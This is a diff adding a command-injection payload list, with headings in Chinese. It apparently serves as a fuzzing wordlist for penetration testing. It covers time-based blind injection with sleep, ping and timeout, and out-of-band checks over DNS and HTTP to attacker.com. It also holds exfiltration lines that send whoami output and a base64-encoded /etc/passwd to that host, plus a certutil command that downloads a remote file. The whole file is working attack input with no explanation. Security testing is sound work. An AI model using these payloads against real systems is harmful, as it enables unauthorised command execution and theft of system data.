@@ -1,0 +1,47 @@
+# 时间盲注 - Linux
+; sleep 5
+| sleep 5
+$(sleep 5)
+`sleep 5`
+& sleep 5
+&& sleep 5
+|| sleep 5
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# 时间盲注 - Windows
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& timeout 5
+| timeout 5
+
+# OOB - DNS
+; nslookup attacker.com
+| nslookup attacker.com
+$(nslookup attacker.com)
+`nslookup attacker.com`
+; host attacker.com
+| host attacker.com
+; dig attacker.com
+| dig attacker.com
+
+# OOB - HTTP
+; curl http://attacker.com
+| curl http://attacker.com
+$(curl http://attacker.com)
+; wget http://attacker.com
+| wget http://attacker.com
+$(wget http://attacker.com)
+
+# OOB - 数据外带
+; curl http://attacker.com/$(whoami)
+; curl http://attacker.com/?d=$(cat /etc/passwd | base64)
+; nslookup $(whoami).attacker.com
+; ping -c 1 $(whoami).attacker.com
+
+# OOB - Windows
+& nslookup attacker.com
+| nslookup attacker.com
+& ping attacker.com
+| ping attacker.com
+& certutil -urlcache -f http://attacker.com/x x
